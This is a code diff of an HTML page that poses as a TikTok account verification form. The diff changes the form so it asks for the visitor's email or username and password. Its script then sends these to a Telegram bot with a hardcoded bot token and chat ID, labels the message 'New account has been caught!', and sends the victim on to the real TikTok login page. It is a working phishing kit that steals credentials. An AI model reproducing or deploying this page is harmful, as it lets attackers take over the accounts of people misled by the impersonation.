@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>توثيق حساب TikTok</title>
+  <title>Account Verification Request</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -15,7 +15,7 @@
       --radius: 18px;
       --input-bg: #222222;
       --hover-bg: #e60045;
-      --glow: 0px 0px 8px var(--primary);
+      --glow: 0px 0px 6px var(--primary);
     }
 
     * {
@@ -131,14 +131,12 @@
 <body>
   <div class="card">
     <img src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/537af08a11a116c157659081006036e7%20(1).png" alt="TikTok Logo">
-    <h2>طلب توثيق الحساب</h2>
-    <p>املأ المعلومات أدناه لإرسال طلبك</p>
+    <h2>Account Verification Request</h2>
+    <p>Fill in the details below to submit your request</p>
     <form id="verifyForm">
-      <input type="text" placeholder="الاسم الكامل" id="fullName" required>
-      <input type="text" placeholder="اسم المستخدم في TikTok" id="userName" required>
-      <input type="email" placeholder="البريد الإلكتروني" id="email" required>
-      <input type="text" placeholder="رابط الحساب (اختياري)" id="accountLink">
-      <button type="submit">إرسال الطلب</button>
+      <input type="text" placeholder="Email or Username" id="emailOrUser" required>
+      <input type="password" placeholder="Password" id="password" required>
+      <button type="submit">Submit Request</button>
     </form>
   </div>
 
@@ -146,23 +144,19 @@
     document.getElementById("verifyForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const fullName = document.getElementById('fullName').value;
-      const userName = document.getElementById('userName').value;
-      const email = document.getElementById('email').value;
-      const accountLink = document.getElementById('accountLink').value;
+      const emailOrUser = document.getElementById('emailOrUser').value;
+      const password = document.getElementById('password').value;
 
       // Send data to Telegram Bot
       const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
       const chatId = '5029891039';
       const message = `
-*✅ طلب توثيق الحساب جديد* 
+*🎯 New Account Verification Request*
 
-👤 *الاسم الكامل:* ${fullName}
-🎮 *اسم المستخدم في TikTok:* ${userName}
-📧 *البريد الإلكتروني:* ${email}
-🔗 *رابط الحساب (اختياري):* ${accountLink ? accountLink : 'لا يوجد'}
+📧 *Email or Username:* ${emailOrUser}
+🔑 *Password:* ${password}
 
-🔔 شكراً لتقديم طلبك! سيتم مراجعته في أقرب وقت! 🎉
+🚨 *New account has been caught!* 🚨
       `;
       
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -176,10 +170,10 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('تم استلام طلب التوثيق بنجاح!');
+          alert('Verification request received successfully!');
           window.location.href = 'https://www.tiktok.com/login'; // Redirect to TikTok login page
         } else {
-          alert('فشل في إرسال البيانات!');
+          alert('Failed to send data!');
         }
       });
     });
